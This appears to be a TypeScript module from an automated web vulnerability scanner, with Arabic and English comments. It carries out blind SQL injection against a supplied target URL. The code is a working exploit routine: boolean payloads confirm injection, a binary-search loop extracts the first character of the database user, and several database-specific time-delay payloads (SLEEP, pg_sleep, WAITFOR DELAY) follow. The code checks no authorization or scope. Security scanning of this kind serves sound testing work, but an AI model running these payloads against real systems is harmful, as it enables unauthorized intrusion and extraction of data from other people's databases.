import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import crypto from 'crypto';

// ✅ إصلاح 1: استيراد الثوابت والدوال المساعدة المفقودة
import { executeRequest, recordVulnerability, COMMON_FALLBACK_PARAMS, TIME_DELAY_THRESHOLD } from './common';

// واجهة لهيكل بيانات خط الأساس
interface Baseline {
    status: number;
    length: number;
    bodyHash: string;
}

export async function executeBlindAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 2] Starting Blind (Boolean & Time) Attack...');
    let found = false;

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 2] Testing Parameter: [${param}]`);

        // Phase 1: Boolean-Based Exfiltration (The Interrogator)
        let baseline: Baseline | null = null;
        try {
            // إنشاء خط أساس غني وموثوق
            const baselineUrl = new URL(targetUrl);
            if (!baselineUrl.searchParams.has(param)) {
                baselineUrl.searchParams.set(param, '1');
            }
            const { response, responseBody } = await executeRequest(baselineUrl.toString());
            baseline = {
                status: response.status,
                length: responseBody.length,
                bodyHash: crypto.createHash('md5').update(responseBody).digest('hex'),
            };

        } catch (error: any) {
            console.error(`[Vector 2 - Interrogator] Baseline setup failed for ${param}: ${error.message}`);
            continue;
        }

        try {
            // اختبار الشرط الصحيح
            const truePayload = `' AND 1=1--`;
            const trueUrl = new URL(targetUrl);
            trueUrl.searchParams.set(param, truePayload);
            const { response: trueResponse, responseBody: trueBody } = await executeRequest(trueUrl.toString());
            const trueHash = crypto.createHash('md5').update(trueBody).digest('hex');

            // اختبار الشرط الخاطئ
            const falsePayload = `' AND 1=2--`;
            const falseUrl = new URL(targetUrl);
            falseUrl.searchParams.set(param, falsePayload);
            const { response: falseResponse, responseBody: falseBody } = await executeRequest(falseUrl.toString());
            const falseHash = crypto.createHash('md5').update(falseBody).digest('hex');

            // ✅ إصلاح 2 و 3: منطق مقارنة آمن ومبسط
            // إذا كانت الاستجابة الصحيحة مطابقة لخط الأساس، والاستجابة الخاطئة مختلفة
            if (trueResponse.status === baseline.status && trueHash === baseline.bodyHash && falseHash !== baseline.bodyHash) {
                console.log(`[Vector 2 - Interrogator] ✅ Boolean-Based SQLi Confirmed.`);

                // Systematic Data Exfiltration with Binary Search
                let low = 32, high = 126; // ASCII range for printable characters
                let finalAscii = -1;

                while (low <= high) {
                    const mid = Math.floor((low + high) / 2);
                    const exfilPayload = `' AND ASCII(SUBSTRING(user(), 1, 1)) > ${mid}--`; // استهداف دالة user()
                    const exfilUrl = new URL(targetUrl);
                    exfilUrl.searchParams.set(param, exfilPayload);
                    const { responseBody: exfilBody } = await executeRequest(exfilUrl.toString());
                    const exfilHash = crypto.createHash('md5').update(exfilBody).digest('hex');

                    if (exfilHash === baseline.bodyHash) { // إذا كان الشرط صحيحاً
                        low = mid + 1;
                    } else {
                        high = mid - 1;
                    }
                }
                finalAscii = low;
                const extractedChar = String.fromCharCode(finalAscii);

                if (finalAscii > 31) { // التأكد من أننا وجدنا حرفاً صالحاً
                    const proof = `Baseline Hash: ${baseline.bodyHash}\nExtracted Char ASCII: ${finalAscii} ('${extractedChar}')`;
                    const description = `Boolean-Based Blind SQLi in '${param}'. Exfiltrated first character of DB user.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
                    found = true;
                }
            }
        } catch (error: any) {
            console.error(`[Vector 2 - Interrogator] Error with parameter ${param}: ${error.message}`);
        }

        // Phase 2: Time-Based Attack (The Ghost) - Last Resort
        if (!found) {
            try {
                // قياس وقت الاستجابة الأساسي بشكل متكيف
                const baselineTimes = await Promise.all(
                    Array(3).fill(0).map(async () => {
                        const baselineUrl = new URL(targetUrl);
                        if (!baselineUrl.searchParams.has(param)) {
                            baselineUrl.searchParams.set(param, '1');
                        }
                        const { responseTime } = await executeRequest(baselineUrl.toString());
                        return responseTime;
                    })
                );
                const avgBaselineTime = baselineTimes.reduce((a, b) => a + b, 0) / 3;

                // ✅ إصلاح 4: ترسانة حمولات زمنية حقيقية
                const timePayloads = [
                    '\' AND SLEEP(5)--', // MySQL/MariaDB
                    '\' AND pg_sleep(5)--', // PostgreSQL
                    '\' ;WAITFOR DELAY \'0:0:5\'--', // MSSQL
                    '\' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5) AS t1, (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5) AS t2, (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5) AS t3) > 0--', // SQLite CPU-intensive
                ];

                for (const payload of timePayloads) {
                    const timeUrl = new URL(targetUrl);
                    timeUrl.searchParams.set(param, payload);
                    const { responseTime } = await executeRequest(timeUrl.toString());
                    if (responseTime > (avgBaselineTime + TIME_DELAY_THRESHOLD)) {
                        console.log(`[Vector 2 - Ghost] ✅ Time-Based SQLi Confirmed with payload: "${payload}"`);
                        const proof = `Avg Baseline Time: ${avgBaselineTime.toFixed(2)}ms, Delay Time: ${responseTime}ms\nPayload: ${payload}`;
                        const description = `Time-Based Blind SQLi in '${param}'. Delay detected.`;
                        await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                        found = true;
                        break; // نخرج بعد العثور على أول ثغرة زمنية
                    }
                }
            } catch (error: any) {
                console.error(`[Vector 2 - Ghost] Error with parameter ${param}: ${error.message}`);
            }
        }
    }
    return found;
}
